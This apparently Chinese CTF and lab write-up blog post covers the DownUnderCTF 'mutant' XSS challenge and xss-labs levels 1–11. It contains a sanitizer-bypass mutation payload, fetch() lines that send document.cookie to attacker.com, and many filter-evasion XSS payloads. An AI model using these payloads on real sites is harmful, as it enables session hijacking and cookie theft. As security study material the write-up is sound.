@@ -1,0 +1,352 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一个男人一句话改变我的一生之xss | 再努力一点，她是不是就会回来</title><meta name="author" content="陈羽琳"><meta name="copyright" content="陈羽琳"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言12345_sun_.empty.师傅给我看了一道国际赛easy难度的xss题目，实在不会，于是打算复现一下，结果docker的时候xss-bot拉起太慢，使用镜像之后修改文件又出现问题，所以就单纯的白盒审计一下这道题，&quot;意因&quot;一下，这题的点是解析器的标签&quot;空间&quot;问题,以及常见的顺序验证错误【代码审计中常出现的参数可控问题】一开始看到这道题的时候还在想是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个男人一句话改变我的一生之xss">
+<meta property="og:url" content="https://cyl-love.github.io/posts/33318.html">
+<meta property="og:site_name" content="再努力一点，她是不是就会回来">
+<meta property="og:description" content="前言12345_sun_.empty.师傅给我看了一道国际赛easy难度的xss题目，实在不会，于是打算复现一下，结果docker的时候xss-bot拉起太慢，使用镜像之后修改文件又出现问题，所以就单纯的白盒审计一下这道题，&quot;意因&quot;一下，这题的点是解析器的标签&quot;空间&quot;问题,以及常见的顺序验证错误【代码审计中常出现的参数可控问题】一开始看到这道题的时候还在想是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cyl-love.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-10-20T11:06:38.000Z">
+<meta property="article:modified_time" content="2025-10-20T11:13:18.707Z">
+<meta property="article:author" content="陈羽琳">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cyl-love.github.io/img/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "一个男人一句话改变我的一生之xss",
+  "url": "https://cyl-love.github.io/posts/33318.html",
+  "image": "https://cyl-love.github.io/img/1.jpg",
+  "datePublished": "2025-10-20T11:06:38.000Z",
+  "dateModified": "2025-10-20T11:13:18.707Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "陈羽琳",
+      "url": "https://cyl-love.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://cyl-love.github.io/posts/33318.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一个男人一句话改变我的一生之xss',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/1.jpg" alt="Logo"><span class="site-name">再努力一点，她是不是就会回来</span></a><a class="nav-page-title" href="/"><span class="site-name">一个男人一句话改变我的一生之xss</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">一个男人一句话改变我的一生之xss</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-20T11:06:38.000Z" title="发表于 2025-10-20 19:06:38">2025-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-20T11:13:18.707Z" title="更新于 2025-10-20 19:13:18">2025-10-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%B8%80%E4%B8%AA%E7%94%B7%E4%BA%BA%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%94%B9%E5%8F%98%E6%88%91%E7%9A%84%E4%B8%80%E7%94%9F/">一个男人一句话改变我的一生</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_sun_.empty.师傅给我看了一道国际赛easy难度的xss题目，实在不会，于是打算复现一下，结果docker的时候xss-bot拉起太慢，使用镜像之后修改文件又出现问题，所以就单纯的白盒审计一下这道题，&quot;意因&quot;一下，这题的点是解析器的标签&quot;空间&quot;问题,以及常见的顺序验证错误【代码审计中常出现的参数可控问题】</span><br><span class="line"></span><br><span class="line">一开始看到这道题的时候还在想是不是自己的xss知识点缺失很大，于是打算整理复现一手关于xss的基础知识，方便以后见到好翻翻笔记，结果是标签问题【更大的盲区，所以后面不涉及css之类的xss，xss原型链污染，dom属性的深层次研究，遇到了再说，嘻嘻】，感谢sun师傅的拷打，让我又又又涨见识了</span><br><span class="line"></span><br><span class="line">这篇文章个人感觉还是很水的，因为感觉东西还是特别多，研究不深，有什么错误的地方希望跟师傅们交流，大师傅快来拷打我，我一定会努力的，呜呜呜。</span><br></pre></td></tr></table></figure>
+
+<h1 id="mutant"><a href="#mutant" class="headerlink" title="mutant"></a>mutant</h1><p><a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/">https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/</a></p>
+<p><img src="/../images/image-20251020163628329.png" alt="image-20251020163628329"></p>
+<p>使用了<template>标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;是 HTML5 引入的特殊元素，它的内容被视为&quot;惰性&quot;的：</span><br><span class="line">不会立即渲染</span><br><span class="line">不会执行脚本</span><br><span class="line">不会加载资源</span><br><span class="line">保持内容隔离，直到被激活使用</span><br></pre></td></tr></table></figure>
+
+<p>if (n.attributes)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">移除所有属性</span><br></pre></td></tr></table></figure>
+
+<p>if (n.nodeName !&#x3D;&#x3D; “#document-fragment” &amp;&amp;       (n.nodeName.length &#x3D;&#x3D;&#x3D; 6 || n.nodeName.length &#x3D;&#x3D;&#x3D; 8))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除特定长度标签名的元素</span><br></pre></td></tr></table></figure>
+
+<p>for (let i &#x3D; n.children.length - 1; i &gt;&#x3D; 0; i–)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">深度遍历整个DOM树</span><br></pre></td></tr></table></figure>
+
+<p>payload解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;math&gt;</span><br><span class="line">    &lt;mtext&gt;&lt;/form&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;malignmark&gt;</span><br><span class="line">    &lt;style&gt;&lt;/math&gt;</span><br><span class="line">&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>解析器遇到<code>&lt;form&gt;</code>开始标签然后是<code>&lt;math&gt;</code>标签（MathML命名空间）接着是<code>&lt;mtext&gt;</code>标签【这里是mathml的元素】</p>
+</li>
+<li><p><code>&lt;/form&gt;</code>：在MathML命名空间内遇到<code>&lt;/form&gt;</code>【html元素】会触发特殊行为解析器会”关闭”当前表单，解析器对其进行处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;/form&gt; </span><br><span class="line">&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;/math&gt; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后续<style>【是在html的标签，出现在mathml中】,</math>使得解释器混淆触发闭合<form></p>
+</li>
+<li><p><code>malignmark</code>标签名长度是10，不会被删除<code>style</code>标签名长度是5，不会被删除<code>img</code>标签名长度是3</p>
+</li>
+</ol>
+<p>解释器处理时间：</p>
+<p>DOM 变异在 <code>innerHTML</code>赋值时已经发生</p>
+<p><code>onerror</code>在属性移除前已经生效</p>
+<p>项目会让xss-bot来触发访问该链，要获得其cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=1 onerror=&quot;fetch(`https://attacker.com/steal?cookie=$&#123;encodeURIComponent(document.cookie)&#125;`)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;https://attacker.com/steal&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    cookie: document.cookie,</span><br><span class="line">    url: location.href,</span><br><span class="line">    userAgent: navigator.userAgent</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这是手搓的平台搭建获取cookie方式</p>
+<p>这题的关键点是混淆解析器，在mathml空间中标签和html空间中标签的差异，引起解析器对于异常代码的处理</p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>有些引用在文章当中</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80637449/article/details/153076191">XSS 漏洞全解析：从原理到实战-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12336">XSS原理分析与绕过总结-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/3699">XSS总结-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/423546.html">XSS 漏洞深度解析：攻防对抗与高阶利用 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/10/xss2.html#%E6%80%BB%E7%BB%93">XSS 攻击思路总结 | 国光</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/01/xss.html">XSS 从零开始 | 国光</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV123yAYMEwb/?p=53&share_source=copy_web&vd_source=46dcac097257d547144350b30f96978c">https://www.bilibili.com/video/BV123yAYMEwb/?p=53&amp;share_source=copy_web&amp;vd_source=46dcac097257d547144350b30f96978c</a></p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XSS 是攻击者通过在网页中注入恶意 JavaScript 脚本，当用户访问被注入的页面时，脚本在用户浏览器中执行，从而实现窃取 cookie、劫持会话、钓鱼攻击等恶意操作的漏洞。其本质是Web 应用对用户输入的过滤不严格，导致未经过滤的输入被当作 HTML&#x2F;JavaScript 代码在浏览器中解析执行。</p>
+<h1 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a><strong>反射型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本通过 URL 参数传入，服务器未过滤直接返回页面中</span><br><span class="line">非持久化，需诱骗用户点击含恶意参数的 URL</span><br><span class="line">适合钓鱼攻击（如伪造登录链接）、一次性会话劫持</span><br></pre></td></tr></table></figure>
+
+<h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a><strong>存储型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本被存储到服务器（如数据库、文件），用户访问页面时被加载执行</span><br><span class="line">持久化，所有访问该页面的用户都会触发</span><br><span class="line">危害最大，可批量攻击（如论坛、留言板）、长期控制目标</span><br></pre></td></tr></table></figure>
+
+<h2 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a><strong>DOM 型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本未经过服务器，仅在客户端通过 JavaScript 操作 DOM 时注入</span><br><span class="line">完全在客户端执行，服务器响应中无恶意代码</span><br><span class="line">难被服务器端 WAF 检测，适合绕过防护机制</span><br></pre></td></tr></table></figure>
+
+<h1 id="xss靶场"><a href="#xss靶场" class="headerlink" title="xss靶场"></a>xss靶场</h1><h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><p>【基础认识】</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L00kback/p/17552275.html">xss-labs靶场1-20关详解 - L00kback - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://skywt.cn/blog/xss-labs-tutorial#level-1%E6%96%87%E6%9C%AC%E8%A7%A3%E6%9E%90%E4%B8%BA-html">xss-labs 通关教程 - 博客</a></p>
+<h3 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h3><p><img src="/../images/image-20251017141145726.png" alt="image-20251017141145726"></p>
+<p>代码直接将从URL参数<code>name</code>获取的用户输入（<code>$str</code>）拼接进HTML页面输出</p>
+<p>没有进行任何过滤或转义处理,直接注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve2"><a href="#leve2" class="headerlink" title="leve2"></a>leve2</h3><p><img src="/../images/image-20251017141918087.png" alt="image-20251017141918087"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars($str)  将字符串中的特殊字符转换为HTML实体</span><br></pre></td></tr></table></figure>
+
+<p>但是在表单当中的value值没有进行过滤，在这里可以进行构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将这一句的value=&quot;x&quot;&gt;</span><br><span class="line">x如果填入&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;就等于插入了一句js代码</span><br><span class="line">value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve3"><a href="#leve3" class="headerlink" title="leve3"></a>leve3</h3><p><img src="/../images/image-20251017142811091.png" alt="image-20251017142811091"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 &lt;、&gt;、&amp;、&#x27;、&quot; 这五个字符，基本可以防范这里的 XSS 攻击。</span><br><span class="line">但是，8.1.0 以下版本的 PHP 默认只会转义 &lt;、&gt;、&amp;、&quot; 这四个字符，不会转义单引号 &#x27;。这就给这个函数带来了巨大的安全隐患。</span><br><span class="line"></span><br><span class="line">&lt;8.1.0</span><br><span class="line">htmlspecialchars()函数把预定义的字符转换为 HTML 实体</span><br><span class="line">预定义的字符有：</span><br><span class="line"> &amp; （和号）成为 &amp;amp;</span><br><span class="line"> &quot; （双引号）成为 &amp;quot;</span><br><span class="line"> &#x27; （单引号）成为 &#x27;</span><br><span class="line"> &lt; （小于）成为 &amp;lt;</span><br><span class="line"> &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么就可以使用’来闭合value&#x3D;’’ 但是&lt;被过滤成了&amp;1t 那么就构造不出额外的语句，在句内构造可以使用到触发器鼠标点击事件<code>onfocus``onclinck``onmouseover</code>等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=javascript:alert(1)</span><br><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve4"><a href="#leve4" class="headerlink" title="leve4"></a>leve4</h3><p><img src="/../images/image-20251017144147810.png" alt="image-20251017144147810"></p>
+<p>这里的value没有使用htmlspecialchar()来转义，但是使用了str_replace()来将&lt;和&gt;转化成空格 可以使用””闭合value构造payload 但是不能使用&lt;和&gt; 那就可以继续使用触发器来进行过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)</span><br><span class="line">&quot;onmouseover=alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h3><p><img src="/../images/image-20251017145015924.png" alt="image-20251017145015924"></p>
+<p>这里的value依旧没有使用htmlspecialchar()来转义，但是使用了str_replace()来将&lt;script和on转化带下划线的形式 说明不能使用鼠标触发事件了因为都带着on，可以利用 JavaScript 的 URI</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt; 标签的 href 值并非只能是 URL，而是 URI。URI（Uniform Resource Identifier）可以视为 URL 的超集，其不仅包含以 protocol://address 开头的 URL，也包含 protocol:content 这种形式的地址（参见 RFC 3986）。经常用到的有：javascript: 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；mailto: 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。</span><br></pre></td></tr></table></figure>
+
+<p>使用”&gt;闭合前一句，再构造<a></a>语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve6"><a href="#leve6" class="headerlink" title="leve6"></a>leve6</h3><p><img src="/../images/image-20251017145811434.png" alt="image-20251017145811434"></p>
+<p>过滤增加了src,data,href</p>
+<p>HTML 并不区分大小写,所以所以将 href 替换大小写就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrEf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve7"><a href="#leve7" class="headerlink" title="leve7"></a>leve7</h3><p>跟6不一样是简单过滤，而是全部置空了</p>
+<p><img src="/../images/image-20251017174535233.png" alt="image-20251017174535233"></p>
+<p>经典的只过滤了一次，只要构造了过滤之后还是能使用的payload就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;scriscriptpt&gt;alert(1);&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve8"><a href="#leve8" class="headerlink" title="leve8"></a>leve8</h3><p><img src="/../images/image-20251017183446774.png" alt="image-20251017183446774"></p>
+<p>value的值被htmlspecialchars()函数过滤了，但是在<a>标签当中还有</p>
+<p>想要构造javascript:alert(1)，但是会变成javascr_ipt</p>
+<p>href的属性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTML 实体有两种写法，第一种是之前提到的 &amp;entity_name; 形式，比如 $lt; 表示小于号；第二种是 &amp;#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 &amp;#60; 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。</span><br></pre></td></tr></table></figure>
+
+<p>那么只要对payload进行html实体转化就可【全局和部分都可以】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve9"><a href="#leve9" class="headerlink" title="leve9"></a>leve9</h3><p><img src="/../images/image-20251018002224373.png" alt="image-20251018002224373"></p>
+<p>在8的基础上对加友链进行了验证是否含有http:&#x2F;&#x2F;字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strpos()</span><br><span class="line">函数用于在字符串中查找子字符串http://的位置。如果找到了子字符串，则返回子字符串的起始位置（也就是一个非负整数值）。如果没有找到子字符串，则返回false。</span><br></pre></td></tr></table></figure>
+
+<p>那么就可以开始改造8的payload,将http:&#x2F;&#x2F;注释掉就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)//http://</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve10"><a href="#leve10" class="headerlink" title="leve10"></a>leve10</h3><p><img src="/../images/image-20251018004243477.png" alt="image-20251018004243477"></p>
+<p>有三个表单是hidden的，但是只有t_sort可以get控制以及参与解析</p>
+<p>关于&lt;&gt;的过滤就可以闭合value使用鼠标事件，以及hidden可以使用type对后面的hidden进行重置就不用在html上面改出表单再提交了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">?keyword=1&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve11"><a href="#leve11" class="headerlink" title="leve11"></a>leve11</h3><p><img src="/../images/image-20251018005131086.png" alt="image-20251018005131086"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_REFERER&#x27;]是一个PHP超全局变量，用于获取当前页面的前一个页面的URL地址。</span><br></pre></td></tr></table></figure>
+
+<p>跟10的区别就是将payload放到了ref头上</p>
+<p><img src="/../images/image-20251018005401956.png" alt="image-20251018005401956"></p>
